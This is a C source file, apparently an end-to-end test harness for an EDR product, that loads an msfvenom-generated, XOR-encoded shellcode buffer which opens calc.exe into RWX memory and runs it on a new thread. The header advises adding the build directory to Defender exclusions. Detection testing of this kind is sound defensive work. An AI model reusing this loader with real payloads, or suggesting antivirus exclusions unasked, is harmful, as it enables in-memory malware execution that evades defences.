/*
 * shellcode_runner.c
 * Shellcode loader for ArgusEDR E2E testing.
 *
 * Allocates RWX memory, copies a Metasploit calc.exe payload via memcpy,
 * then executes it on a new thread — mimicking real-world in-process shellcode
 * execution without any WriteProcessMemory calls.
 *
 * Workflow:
 *   1. Start argus_agent.exe
 *   2. Start shellcode_runner.exe  (note the printed PID)
 *   3. Inject:  injector.exe <PID> argus_hook.dll
 *               injector.exe <PID> argus_pesieve.dll
 *   4. Press ENTER  — shellcode is allocated + copied
 *   5. Press ENTER  — shellcode thread is created; calc.exe opens
 *
 * !! WARNING !!
 * The payload is structurally identical to a Metasploit stager.
 * Add the build directory to Defender exclusions before running.
 */

#include <windows.h>
#include <stdio.h>

/* msfvenom -p windows/x64/exec CMD=calc.exe -f c -b '\x00' */
/* Generated: x64/xor encoder, 319 bytes                     */
unsigned char buf[] =
"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\x9a\xcc\xb7\xa9\x14\xae\x10\x6a\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x66\x84\x34"
"\x4d\xe4\x46\xd0\x6a\x9a\xcc\xf6\xf8\x55\xfe\x42\x3b\xcc"
"\x84\x86\x7b\x71\xe6\x9b\x38\xfa\x84\x3c\xfb\x0c\xe6\x9b"
"\x38\xba\x84\x3c\xdb\x44\xe6\x1f\xdd\xd0\x86\xfa\x98\xdd"
"\xe6\x21\xaa\x36\xf0\xd6\xd5\x16\x82\x30\x2b\x5b\x05\xba"
"\xe8\x15\x6f\xf2\x87\xc8\x8d\xe6\xe1\x9f\xfc\x30\xe1\xd8"
"\xf0\xff\xa8\xc4\x25\x90\xe2\x9a\xcc\xb7\xe1\x91\x6e\x64"
"\x0d\xd2\xcd\x67\xf9\x9f\xe6\x08\x2e\x11\x8c\x97\xe0\x15"
"\x7e\xf3\x3c\xd2\x33\x7e\xe8\x9f\x9a\x98\x22\x9b\x1a\xfa"
"\x98\xdd\xe6\x21\xaa\x36\x8d\x76\x60\x19\xef\x11\xab\xa2"
"\x2c\xc2\x58\x58\xad\x5c\x4e\x92\x89\x8e\x78\x61\x76\x48"
"\x2e\x11\x8c\x93\xe0\x15\x7e\x76\x2b\x11\xc0\xff\xed\x9f"
"\xee\x0c\x23\x9b\x1c\xf6\x22\x10\x26\x58\x6b\x4a\x8d\xef"
"\xe8\x4c\xf0\x49\x30\xdb\x94\xf6\xf0\x55\xf4\x58\xe9\x76"
"\xec\xf6\xfb\xeb\x4e\x48\x2b\xc3\x96\xff\x22\x06\x47\x47"
"\x95\x65\x33\xea\xe1\xae\xaf\x10\x6a\x9a\xcc\xb7\xa9\x14"
"\xe6\x9d\xe7\x9b\xcd\xb7\xa9\x55\x14\x21\xe1\xf5\x4b\x48"
"\x7c\xaf\x63\x74\xf5\xf2\x8d\x0d\x0f\x81\x13\x8d\x95\x4f"
"\x84\x34\x6d\x3c\x92\x16\x16\x90\x4c\x4c\x49\x61\xab\xab"
"\x2d\x89\xbe\xd8\xc3\x14\xf7\x51\xe3\x40\x33\x62\xca\x75"
"\xc2\x73\x44\xff\xb4\xd2\xa9\x14\xae\x10\x6a";

int main(void)
{
    DWORD pid = GetCurrentProcessId();
    printf("  ArgusEDR  /  Shellcode Runner\n");
    printf("  ----------------------------------------\n");
    printf("  PID    %lu\n", pid);
    printf("  Inject injector.exe %lu argus_hook.dll\n", pid);
    printf("         injector.exe %lu argus_pesieve.dll\n\n", pid);
    printf("  Press ENTER after injection...\n");
    getchar();

    LPVOID lpShellcode = VirtualAlloc(
        NULL, sizeof(buf),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    if (!lpShellcode) {
        fprintf(stderr, "  ERROR  VirtualAlloc failed (%lu)\n", GetLastError());
        return 1;
    }

    memcpy(lpShellcode, buf, sizeof(buf));

    printf("  Press ENTER to execute...\n");
    getchar();

    HANDLE hThread = CreateThread(
        NULL, 0,
        (LPTHREAD_START_ROUTINE)lpShellcode,
        NULL, 0, NULL);
    if (!hThread) {
        fprintf(stderr, "  ERROR  CreateThread failed (%lu)\n", GetLastError());
        VirtualFree(lpShellcode, 0, MEM_RELEASE);
        return 1;
    }

    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    VirtualFree(lpShellcode, 0, MEM_RELEASE);
    return 0;
}
